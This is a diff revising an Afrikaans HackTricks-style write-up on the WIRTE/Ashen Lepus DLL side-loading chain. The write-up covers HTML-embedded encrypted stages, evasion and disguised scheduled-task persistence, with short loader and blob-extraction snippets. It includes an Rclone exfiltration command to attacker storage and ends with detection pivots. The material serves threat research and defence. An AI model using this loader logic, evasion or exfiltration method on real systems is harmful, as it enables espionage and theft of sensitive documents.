@@ -1,24 +1,25 @@
-# Advanced DLL Side-Loading With HTML-Embedded Payload Staging
+# Gevorderde DLL Side-Loading met HTML-ingebedde Payload-staging
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Tradecraft Oorsig
+## Oorsig van Tradecraft
 
-Ashen Lepus (ook bekend as WIRTE) het 'n herhaalbare patroon gewapen wat DLL sideloading, staged HTML payloads en modulêre .NET backdoors kombineer om binne Midde-Oosterse diplomatieke netwerke te persisteer. Die tegniek is herbruikbaar deur enige operator omdat dit op die volgende staatmaak:<sup>[[1]](#references)</sup>
+Ashen Lepus (ook bekend as WIRTE) het ’n herhaalbare patroon as wapen gebruik wat DLL sideloading, gefaseerde HTML-payloads en modulêre .NET-backdoors kombineer om ’n vastrapplek in diplomatieke netwerke in die Midde-Ooste te behou. Enige operateur kan die tegniek hergebruik omdat dit op die volgende staatmaak:<sup>[[1]](#references)</sup>
 
-- **Argiefgebaseerde social engineering**: onskadelike PDF's instrueer teikens om 'n RAR-argief vanaf 'n file-sharing-webwerf af te laai. Die argief bevat 'n realisties lykende document viewer EXE, 'n malicious DLL vernoem na 'n trusted library (bv. `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), en 'n lokmiddel-`Document.pdf`.
-- **Misbruik van DLL-soekvolgorde**: die slagoffer dubbelklik op die EXE, Windows los die DLL-import vanuit die huidige gids op, en die malicious loader (AshenLoader) voer binne die trusted process uit terwyl die lokmiddel-PDF oopmaak om agterdog te vermy.
-- **Living-off-the-land staging**: elke latere stage (AshenStager → AshenOrchestrator → modules) word van die skyf af gehou totdat dit benodig word, en word as encrypted blobs gelewer wat binne andersins onskadelike HTML-responses versteek is.
+- **Argiefgebaseerde social engineering**: onskadelike PDF’s gee teikens opdrag om ’n RAR-argief vanaf ’n lêerdelingwebwerf af te laai. Die argief bevat ’n dokumentkyker-EXE wat eg lyk, ’n kwaadwillige DLL wat na ’n vertroude biblioteek vernoem is (bv. `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), en ’n lokmiddel-`Document.pdf`.
+- **Misbruik van die DLL-soekvolgorde**: die slagoffer dubbelklik die EXE, Windows laai die DLL-invoer vanaf die huidige gids, en die kwaadwillige loader (AshenLoader) word binne die vertroude proses uitgevoer terwyl die lokmiddel-PDF oopmaak om agterdog te vermy.
+- **Living-off-the-land-staging**: elke daaropvolgende stadium (AshenStager → AshenOrchestrator → modules) bly van die skyf af totdat dit nodig is, en word afgelewer as geënkripteerde blobs wat in andersins onskadelike HTML-antwoorde versteek is.
 
-## Multi-Stage Side-Loading Chain
+## Multi-stadium Side-Loading-ketting
 
-1. **Decoy EXE → AshenLoader**: die EXE side-load AshenLoader, wat host recon uitvoer, dit met AES-CTR encrypt, en dit binne roterende parameters soos `token=`, `id=`, `q=`, of `auth=` POST na API-agtige paths (bv. `/api/v2/account`).<sup>[[1]](#references)</sup>
-2. **HTML extraction**: die C2 verraai die volgende stage slegs wanneer die client-IP na die teikenstreek geolocateer word en die `User-Agent` met die implant ooreenstem, wat sandboxes frustreer. Wanneer die checks slaag, bevat die HTTP-body 'n `<headerp>...</headerp>`-blob met die Base64/AES-CTR encrypted AshenStager-payload.
-3. **Second sideload**: AshenStager word met 'n ander legitimate binary ontplooi wat `wtsapi32.dll` importeer. Die malicious copy wat in die binary geïnjecteer is, fetch meer HTML, en sny hierdie keer `<article>...</article>` uit om AshenOrchestrator te herwin.
-4. **AshenOrchestrator**: 'n modulêre .NET-controller wat 'n Base64 JSON-config decodeer. Die config se `tg`- en `au`-velde word aaneengeskakel/gehash om die AES-key te vorm, wat `xrk` decrypt. Die resulterende bytes tree op as 'n XOR-key vir elke module-blob wat daarna gefetch word.
-5. **Module delivery**: elke module word deur HTML-comments beskryf wat die parser na 'n arbitrêre tag herlei, wat static rules breek wat slegs vir `<headerp>` of `<article>` soek. Modules sluit persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`), en file exploration (`FE`) in.
+1. **Lokmiddel-EXE → AshenLoader**: die EXE laai AshenLoader via sideloading, waarna dit host recon uitvoer, dit met AES-CTR enkripteer en dit POST in wisselende parameters soos `token=`, `id=`, `q=` of `auth=` na API-agtige paaie (bv. `/api/v2/account`).<sup>[[1]](#references)</sup>
+2. **HTML-onttrekking**: die C2 verklap die volgende stadium slegs wanneer die kliënt-IP na die teikenstreek geolokaliseer word en die `User-Agent` met die implant ooreenstem, wat sandboxes frustreer. Wanneer die kontroles slaag, bevat die HTTP-liggaam ’n `<headerp>...</headerp>`-blob met die Base64/AES-CTR-geënkripteerde AshenStager-payload.
+3. **Tweede sideload**: AshenStager word ontplooi saam met ’n ander wettige binêre lêer wat `wtsapi32.dll` invoer. Die kwaadwillige kopie wat in die binêre lêer ingespuit is, haal meer HTML op en haal dié keer AshenOrchestrator uit `<article>...</article>`.
+4. **AshenOrchestrator**: ’n modulêre .NET-beheerder wat ’n Base64 JSON-konfigurasie dekodeer. Die konfigurasie se `tg`- en `au`-velde word aaneengeskakel/gehash om die AES-sleutel te vorm, wat `xrk` dekripteer. Die resulterende grepe dien as ’n XOR-sleutel vir elke module-blob wat daarna opgehaal word.
+5. **Module-aflewering**: elke module word beskryf deur HTML-kommentaar wat die ontleder na ’n arbitrêre tag herlei, en sodoende statiese reëls omseil wat net vir `<headerp>` of `<article>` soek. Modules sluit volharding (`PR*`), verwyderaars (`UN*`), verkenning (`SN`), skermvaslegging (`SCT`) en lêerverkenning (`FE`) in.
 
-### HTML Container Parsing Pattern
+### HTML-houer-ontledingspatroon
+
 ```csharp
 var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
 var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
@@ -26,9 +27,11 @@ var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
 var module = XorBytes(aesBytes, xorKey);
 LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
 ```
-Selfs al blokkeer of verwyder verdedigers ’n spesifieke element, hoef die operateur slegs die merker waarna in die HTML-kommentaar verwys word, te verander om aflewering te hervat.<sup>[[1]](#references)</sup>
 
-### Vinnige ekstraksiehulpmiddel (Python)
+Selfs al blokkeer of verwyder verdedigers ’n spesifieke element, hoef die operateur net die merker te verander waarna die HTML-opmerking verwys om aflewering te hervat.<sup>[[1]](#references)</sup>
+
+### Vinnige onttrekkingshulp (Python)
+
 ```python
 import base64, re, requests
 
@@ -38,18 +41,20 @@ b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
 blob = base64.b64decode(b64)
 # decrypt blob with AES-CTR, then XOR if required
 ```
-## HTML Staging Evasion Parallels
 
-Onlangse HTML smuggling-navorsing (Talos) beklemtoon payloads wat as Base64-stringe binne `<script>`-blokke in HTML-aanhegsels versteek word en tydens runtime deur JavaScript gedekodeer word.<sup>[[2]](#references)</sup> Dieselfde truuk kan vir C2-antwoorde hergebruik word: stage encrypted blobs binne 'n script tag (of ander DOM-element) en dekodeer hulle in-memory vóór AES/XOR, sodat die bladsy soos gewone HTML lyk. Talos wys ook gelaagde obfuscation (identifier-hernoeming plus Base64/Caesar/AES) binne script tags, wat goed ooreenstem met HTML-staged C2 blobs.<sup>[[2]](#references)</sup> 'n Latere Talos-skrywe oor **hidden text salting** is ook hier relevant: om Base64 met irrelevante HTML-kommentaar of whitespace te verdeel, is genoeg om eenvoudige regex extractors te breek, terwyl browser-side reconstruction eenvoudig bly.<sup>[[7]](#references)</sup>
+## HTML-stagingontduikingsparallelle
 
-## Onlangse Variant Notes (2024-2025)
+Onlangse navorsing oor HTML-smuggling (Talos) beklemtoon payloads wat as Base64-stringe binne `<script>`-blokke in HTML-aanhegsels versteek en tydens looptyd met JavaScript gedekodeer word.<sup>[[2]](#references)</sup> Dieselfde truuk kan vir C2-antwoorde hergebruik word: plaas geënkripteerde blobs binne ’n script-tag (of ander DOM-element) en dekodeer dit in geheue voor AES/XOR, sodat die bladsy soos gewone HTML lyk. Talos wys ook gelaagde verduistering (hernoeming van identifiseerders plus Base64/Caesar/AES) binne script-tags, wat goed pas by HTML-geopgestelde C2-blobs.<sup>[[2]](#references)</sup> ’n Latere Talos-artikel oor **hidden text salting** is ook hier relevant: om Base64 met irrelevante HTML-kommentaar of witspasie op te breek, is genoeg om eenvoudige regex-ekstraktors te fnuik terwyl rekonstruksie aan die blaaierskant eenvoudig bly.<sup>[[7]](#references)</sup>
 
-- Check Point het in 2024 WIRTE-campaigns waargeneem wat steeds op archive-based sideloading gesteun het, maar `propsys.dll` (stagerx64) as die eerste stage gebruik het. Die stager dekodeer die volgende payload met Base64 + XOR (key `53`), stuur HTTP requests met 'n hardcoded `User-Agent`, en haal encrypted blobs uit wat tussen HTML tags ingebed is. In een vertakking is die stage gerekonstrueer uit 'n lang lys ingebedde IP-stringe wat met `RtlIpv4StringToAddressA` gedekodeer is, en daarna in die payload bytes aaneengeskakel is.<sup>[[3]](#references)</sup>
-- OWN-CERT het vroeëre WIRTE-tooling gedokumenteer waar die side-loaded `wtsapi32.dll` dropper strings met Base64 + TEA beskerm het en die DLL-naam self as die encryption key gebruik het; daarna is host-identification data met XOR/Base64 ge-obfuskeer voordat dit na die C2 gestuur is.<sup>[[4]](#references)</sup>
+## Onlangse variantnotas (2024-2025)
 
-## Rekonstruksie van IP-Encoded Stages
+- Check Point het WIRTE-veldtogte in 2024 waargeneem wat steeds op argiefgebaseerde sideloading berus het, maar `propsys.dll` (stagerx64) as die eerste stadium gebruik het. Die stager dekodeer die volgende payload met Base64 + XOR (sleutel `53`), stuur HTTP-versoeke met ’n hardgekodeerde `User-Agent` en onttrek geënkripteerde blobs wat tussen HTML-tags ingebed is. In een tak is die stadium uit ’n lang lys ingebedde IP-stringe gerekonstrueer, wat met `RtlIpv4StringToAddressA` gedekodeer en daarna tot die payload-grepe aaneengeskakel is.<sup>[[3]](#references)</sup>
+- OWN-CERT het vroeëre WIRTE-gereedskap gedokumenteer waarin die sy-gelaaide `wtsapi32.dll`-dropper stringe met Base64 + TEA beskerm het en die DLL-naam self as die dekripsiesleutel gebruik het. Daarna het dit gasheeridentifikasiedata met XOR/Base64 verduister voordat dit na die C2 gestuur is.<sup>[[4]](#references)</sup>
 
-WIRTE se 2024 `propsys.dll`-vertakking wys dat die volgende PE nie as een aaneenlopende HTML blob hoef te bestaan nie. Die loader kan stage bytes as dotted-quad strings stoor en dit met `RtlIpv4StringToAddressA` herbou, 'n patroon wat nou verwant is aan Hive se **IPfuscation**-tradecraft.<sup>[[3]](#references)[[5]](#references)</sup> Operasioneel is dit nuttig wanneer die actor wil hê dat die HTML-bladsy iets moet bevat wat soos onskadelike IOCs of config data lyk, eerder as 'n ooglopende Base64 payload.
+## Rekonstruksie van IP-geënkodeerde stadiums
+
+WIRTE se `propsys.dll`-tak van 2024 wys dat die volgende PE nie as een aaneenlopende HTML-blob hoef voor te kom nie. Die loader kan stadiumgrepe as dotted-quad-stringe stoor en dit met `RtlIpv4StringToAddressA` herbou, ’n patroon wat nou verband hou met Hive se **IPfuscation**-werkwyse.<sup>[[3]](#references)[[5]](#references)</sup> Operasioneel is dit nuttig wanneer die akteur wil hê dat die HTML-bladsy eerder skynbaar onskadelike IOCs of konfigurasiedata as ’n ooglopende Base64-payload moet bevat.
+
 ```python
 import pathlib, re, socket
 
@@ -58,67 +63,67 @@ ips = re.findall(r'((?:\d{1,3}\.){3}\d{1,3})', text)
 blob = b"".join(socket.inet_aton(ip) for ip in ips)
 pathlib.Path("stage.bin").write_bytes(blob)
 ```
-As die herstelde grepe met `MZ` begin, het jy waarskynlik die volgende PE direk gerekonstrueer. Indien nie, kyk vir ’n voorafgaande XOR/Base64-laag of klein skeidingsgrepe tussen adresse.
 
-## Uitruilbare DLL-name & Host-rotasie
+As die herstelde grepe met `MZ` begin, het jy waarskynlik die volgende PE direk gerekonstrueer. Indien nie, kyk vir ’n voorste XOR/Base64-laag of klein skeidingsgrepe tussen adresse.
 
-’n Sterk eienskap van hierdie patroon is dat die **HTML/AES/XOR-staging-backend identies kan bly terwyl slegs die sideload-paar verander**. WIRTE het tussen `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll` en `propsys.dll` oor veldtogte heen gewissel, wat nuttig is omdat:<sup>[[1]](#references)[[3]](#references)</sup>
+## Verwisselbare DLL-name en host-rotasie
 
-- `propsys.dll` en `wtsapi32.dll` is onopvallende Windows DLL-name wat verdedigers verwag om in `%System32%` / `%SysWOW64%` te bestaan.
-- Publieke katalogusse soos **HijackLibs** karteer reeds baie binaries wat daardie DLL-name vanaf ’n gekopieerde toepassingsgids sal laai, wat operators vervangingshosts bied sonder om die stager te herontwerp.
-- Slegs die export-oppervlak moet per host aangepas word. Die HTML-parser, AES/XOR-roetines en module loader kan gewoonlik onveranderd na ’n forwarding proxy DLL oorgedra word.
+’n Belangrike eienskap van hierdie patroon is dat die **HTML/AES/XOR-staging-backend onveranderd kan bly terwyl net die sideload-paar verander**. WIRTE het oor verskillende veldtogte tussen `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll` en `propsys.dll` gewissel, wat nuttig is omdat:<sup>[[1]](#references)[[3]](#references)</sup>
 
-Vir offensiewe laboratoriumwerk beteken dit dat jy die probleem in **(1) vind ’n stabiele, getekende host wat jou gekose DLL-name plaaslik resolveer** en **(2) hergebruik dieselfde staged-HTML-loaderlogika agter daardie DLL** kan verdeel.
+- `propsys.dll` en `wtsapi32.dll` is alledaagse Windows-DLL-name wat verdedigers verwag om in `%System32%` / `%SysWOW64%` te vind.
+- Openbare katalogusse soos **HijackLibs** koppel reeds baie binaries aan hierdie DLL-name wanneer hulle vanaf ’n gekopieerde toepassingsgids gelaai word. Dit gee operators vervangende hosts sonder dat die stager herontwerp hoef te word.
+- Net die export-oppervlak moet vir elke host aangepas word. Die HTML-parser, AES/XOR-roetines en modulelaaier kan gewoonlik onveranderd na ’n forwarding proxy DLL oorgedra word.
 
-## Crypto & C2-verharding
+Vir offensiewe laboratoriumwerk beteken dit dat jy die probleem in twee dele kan opdeel: **(1) vind ’n stabiele, ondertekende host wat jou gekose DLL-naam plaaslik oplos** en **(2) hergebruik dieselfde staged-HTML-laaierlogika agter daardie DLL**.
 
-- **AES-CTR oral**: huidige loaders bevat 256-bis-sleutels plus nonces (bv. `{9a 20 51 98 ...}`) en voeg opsioneel ’n XOR-laag by met strings soos `msasn1.dll` voor/na dekripsie.<sup>[[1]](#references)</sup>
-- **Variasies in key material**: vroeëre loaders het Base64 + TEA gebruik om ingebedde strings te beskerm, met die dekripsiesleutel afgelei van die kwaadwillige DLL-name (bv. `wtsapi32.dll`).<sup>[[4]](#references)</sup>
-- **Infrastruktuurverdeling + subdomein-camouflage**: staging-bedieners word per tool geskei, oor wisselende ASNs gehuisves en soms deur wettig lykende subdomeine gefront, sodat die kompromittering van een stage nie die res blootlê nie.
-- **Recon-smokkelary**: geënumeerde data sluit nou Program Files-lyste in om waardevolle toepassings raak te sien, en word altyd geënkripteer voordat dit die host verlaat.
-- **URI-wisseling**: query parameters en REST-paaie wissel tussen veldtogte (`/api/v1/account?token=` → `/api/v2/account?auth=`), wat brose detections ongeldig maak.
-- **User-Agent-pinning + veilige redirects**: C2-infrastruktuur reageer slegs op presiese UA-strings en redirect andersins na welwillende nuus-/gesondheidswerwe om daarin op te gaan.
-- **Gated delivery**: bedieners is geo-fenced en antwoord slegs aan regte implants. Ongemagtigde clients ontvang onskadelike HTML.
+## Crypto- en C2-verharding
 
-## Persistence & Execution Loop
+- **Oral AES-CTR**: huidige laaiers bevat 256-bis-sleutels plus nonces (bv. `{9a 20 51 98 ...}`) en voeg soms ’n XOR-laag met stringe soos `msasn1.dll` voor/na dekripsie by.<sup>[[1]](#references)</sup>
+- **Variante in sleutelmateriaal**: vroeëre laaiers het Base64 + TEA gebruik om ingebedde stringe te beskerm, met die dekripsiesleutel afgelei van die kwaadwillige DLL-naam (bv. `wtsapi32.dll`).<sup>[[4]](#references)</sup>
+- **Verdeelde infrastruktuur + subdomein-kamoeflering**: staging-bedieners word per instrument geskei, oor verskillende ASN’e gehuisves en soms deur geloofwaardige subdomeine aangebied, sodat die blootlegging van een stage nie die res blootlê nie.
+- **Verkenningsdata-smokkelary**: die geïnventariseerde data bevat nou Program Files-lyste om waardevolle toepassings te vind, en word altyd geënkripteer voordat dit die host verlaat.
+- **URI-wisseling**: navraagparameters en REST-paaie wissel tussen veldtogte (`/api/v1/account?token=` → `/api/v2/account?auth=`), wat brose opsporingsreëls ongeldig maak.
+- **Vasgepende User-Agent + veilige herleidings**: C2-infrastruktuur reageer net op presiese UA-stringe en herlei andersins na geloofwaardige nuus-/gesondheidswebwerwe om onopvallend te bly.
+- **Beheerde aflewering**: bedieners gebruik geo-afbakening en reageer net op regte implants. Nie-goedgekeurde kliënte ontvang onverdagte HTML.
 
-AshenStager laat scheduled tasks val wat hulle as Windows-onderhoudstake voordoen en via `svchost.exe` uitvoer, bv.:<sup>[[1]](#references)</sup>
+## Volharding- en uitvoeringslus
+
+AshenStager laat geskeduleerde take agter wat hulle as Windows-instandhoudingstake voordoen en via `svchost.exe` loop, bv.:<sup>[[1]](#references)</sup>
 
 - `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
 - `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
 - `C:\Windows\System32\Tasks\Automatic Windows Update`
 
-Hierdie tasks begin die sideloading chain weer tydens boot of met tussenposes, wat verseker dat AshenOrchestrator vars modules kan aanvra sonder om weer aan die skyf te raak.
+Hierdie take begin die sideloading-ketting weer met opstart of met tussenposes, sodat AshenOrchestrator nuwe modules kan aanvra sonder om weer aan die skyf te raak.
 
-## Using Benign Sync Clients for Exfiltration
+## Gebruik van onskadelike Sync-kliënte vir data-uitfiltrering
 
-Operators plaas diplomatieke dokumente in `C:\Users\Public` (wêreldleesbaar en nie verdag nie) deur ’n toegewyde module, en laai dan die wettige [Rclone](https://rclone.org/)-binary af om daardie gids met attacker storage te sinkroniseer. Unit42 merk op dat dit die eerste keer is wat hierdie actor waargeneem is terwyl Rclone vir exfiltration gebruik word, in ooreenstemming met die breër tendens om wettige sync tooling te misbruik om in normale verkeer op te gaan:<sup>[[1]](#references)</sup>
+Operators plaas diplomatieke dokumente met ’n toegewyde module in `C:\Users\Public` (wêreldleesbaar en onverdacht), en laai dan die wettige [Rclone](https://rclone.org/)-binary af om daardie gids met aanvallerberging te sinchroniseer. Unit42 merk op dat dit die eerste keer is dat hierdie akteur Rclone vir data-uitfiltrering gebruik; dit strook met die breër tendens om wettige sync-nutsgoed te misbruik om by normale verkeer in te meng:<sup>[[1]](#references)</sup>
 
-1. **Stage**: kopieer/versamel teikenlêers in `C:\Users\Public\{campaign}\`.
-2. **Configure**: stuur ’n Rclone-config wat na ’n attacker-beheerde HTTPS-endpoint wys (bv. `api.technology-system[.]com`).
-3. **Sync**: voer `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` uit sodat die verkeer soos normale cloud backups lyk.
+1. **Staging**: kopieer/versamel teikenlêers na `C:\Users\Public\{campaign}\`.
+2. **Konfigureer**: verskaf ’n Rclone-konfigurasie wat na ’n aanvallerbeheerde HTTPS-endpoint wys (bv. `api.technology-system[.]com`).
+3. **Sinchroniseer**: voer `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` uit sodat die verkeer soos gewone wolkrugsteun lyk.
 
-Omdat Rclone wyd vir wettige backup-workflows gebruik word, moet verdedigers op anomale executions fokus (nuwe binaries, vreemde remotes of skielike syncing van `C:\Users\Public`).
+Omdat Rclone wyd vir wettige rugsteunwerkvloeie gebruik word, moet verdedigers op afwykende uitvoerings fokus (nuwe binaries, vreemde remotes of skielike sinchronisering van `C:\Users\Public`).
 
-## Detection Pivots
+## Opsporingspunte
 
-- Waarsku oor **signed processes** wat onverwags DLLs vanaf user-writable paths laai (Procmon-filters + `Get-ProcessMitigation -Module`), veral wanneer die DLL-name met `netutils`, `srvcli`, `dwampi`, `wtsapi32` of `propsys` ooreenstem.<sup>[[6]](#references)</sup>
-- Ondersoek verdagte HTTPS-responses vir **groot Base64-blobs wat binne ongewone tags ingebed is** of deur `<!-- TAG: <xyz> -->`-comments beskerm word.
-- Normaliseer HTML eers: **verwyder comments en vou whitespace saam voor Base64-extraction**, omdat hidden-text-salting-styl-evasion payloads oor comment boundaries kan verdeel.
-- Brei HTML-hunting uit na **Base64-strings binne `<script>`-blocks** (HTML-smuggling-styl staging) wat deur JavaScript gedecodeer word voordat AES/XOR-verwerking plaasvind.
-- Hunt vir herhaalde calls na **`RtlIpv4StringToAddressA` gevolg deur buffer assembly**, veral wanneer die omliggende strings lang IPv4-lyste eerder as werklike network targets is.
-- Hunt vir **scheduled tasks** wat `svchost.exe` met nie-service arguments uitvoer of na dropper directories terugwys.
-- Track **C2 redirects** wat slegs payloads vir presiese `User-Agent`-strings terugstuur en andersins na wettige nuus-/gesondheidsdomeine bounce.
-- Monitor vir **Rclone**-binaries wat buite IT-bestuurde liggings verskyn, nuwe `rclone.conf`-lêers of sync jobs wat vanaf staging directories soos `C:\Users\Public` trek.
+- Waarsku oor **ondertekende prosesse** wat onverwags DLL’s vanaf gebruiker-skryfbare paaie laai (Procmon-filters + `Get-ProcessMitigation -Module`), veral wanneer die DLL-name met `netutils`, `srvcli`, `dwampi`, `wtsapi32` of `propsys` ooreenstem.<sup>[[6]](#references)</sup>
+- Ondersoek verdagte HTTPS-antwoorde vir **groot Base64-blokke wat in ongewone tags ingebed is** of deur `<!-- TAG: <xyz> -->`-kommentaar beskerm word.
+- Normaliseer HTML eers: **verwyder kommentaar en vou witspasie saam voor Base64-onttrekking**, omdat ontwykingstegnieke met versteekte tekssouting loonvragte oor kommentaargrense kan verdeel.
+- Brei HTML-soektogte uit na **Base64-stringe binne `<script>`-blokke** (HTML-smuggling-staging) wat deur JavaScript gedekodeer word voor AES/XOR-verwerking.
+- Soek na herhaalde oproepe na **`RtlIpv4StringToAddressA` gevolg deur buffer-samestelling**, veral wanneer die omliggende stringe lang IPv4-lyste is eerder as werklike netwerkteikens.
+- Soek na **geskeduleerde take** wat `svchost.exe` met nie-diensargumente uitvoer of na dropper-gidse wys.
+- Volg **C2-herleidings** wat net loonvragte vir presiese `User-Agent`-stringe terugstuur en andersins na wettige nuus-/gesondheidsdomeine herlei.
+- Monitor vir **Rclone**-binaries buite IT-bestuurde liggings, nuwe `rclone.conf`-lêers of sync-take wat data uit staging-gidse soos `C:\Users\Public` oordra.
 
-## Verwysings
+## References
 
-- [1] [Hamas-geaffilieerde Ashen Lepus teiken Midde-Oosterse diplomatieke entiteite met nuwe AshTag-malware suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
-- [2] [Versteek tussen die tags: Insigte in evasion-tegnieke in HTML-smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
-- [3] [Hamas-geaffilieerde threat actor WIRTE sit sy Midde-Ooste-operasies voort en beweeg na disruptive activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
+- [1] [Ashen Lepus, verbonde aan Hamas, teiken diplomatieke instellings in die Midde-Ooste met die nuwe AshTag-malwarepakket](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
+- [2] [Versteek tussen die tags: insigte in ontduikingstegnieke in HTML-smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
+- [3] [Die Hamas-verbonde bedreigingsakteur WIRTE sit sy bedrywighede in die Midde-Ooste voort en beweeg na ontwrigtende aktiwiteite](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
 - [4] [WIRTE: Op soek na verlore tyd](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
-- [5] [Hive Ransomware ontplooi nuwe IPfuscation-tegniek om detection te vermy](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
-- [6] [Potensiële System DLL-sideloading vanaf nie-System-liggings](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
-- [7] [Geur e-pos threats met hidden-text-salting](https://blog.talosintelligence.com/seasoning-email-threats-with-hidden-text-salting/)
-
+- [5] [Hive Ransomware gebruik nuwe IPfuscation-tegniek om opsporing te vermy](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
+- [6] [Moontlike sideloading van stelsel-DLL’s vanaf nie-stelselliggings](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
+- [7] [Geur e-posbedreigings met versteekte tekssouting](https://blog.talosintelligence.com/seasoning-email-threats-with-hidden-text-salting/)
 {{#include ../../../banners/hacktricks-training.md}}
